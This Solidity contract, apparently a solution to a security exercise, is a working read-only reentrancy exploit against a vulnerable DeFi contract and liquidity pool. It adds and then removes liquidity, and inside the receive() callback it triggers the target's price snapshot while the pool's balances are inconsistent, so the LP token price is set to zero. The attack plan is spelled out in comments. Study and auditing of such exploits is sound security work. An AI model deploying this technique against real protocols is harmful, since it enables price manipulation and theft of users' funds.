// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {VulnerableDeFiContract, ReadOnlyPool} from "./ReadOnly.sol";

contract ReadOnlyAttacker {
    // Plan:
    // pool starts with 101 ETH and 100 LP Tokens
    // snapshotPrice is 101/100 = 1
    // if we add 2 ETH, pool will be at 103 ETH and 102 LP Tokens
    // when removing liquidity, the pool will be temporarily at 101 ETH and 102 LPTokens, before burning
    // at that point we can set lpTokenPrice at VulnerableDeFiContract to 0

    ReadOnlyPool public pool;
    VulnerableDeFiContract public target;

    constructor(ReadOnlyPool _pool, VulnerableDeFiContract _target) {
        pool = _pool;
        target = _target;
    }

    function attack() external payable {
        pool.addLiquidity{value: msg.value}();
        pool.removeLiquidity();
    }

    receive() external payable {
        target.snapshotPrice();
    }
}
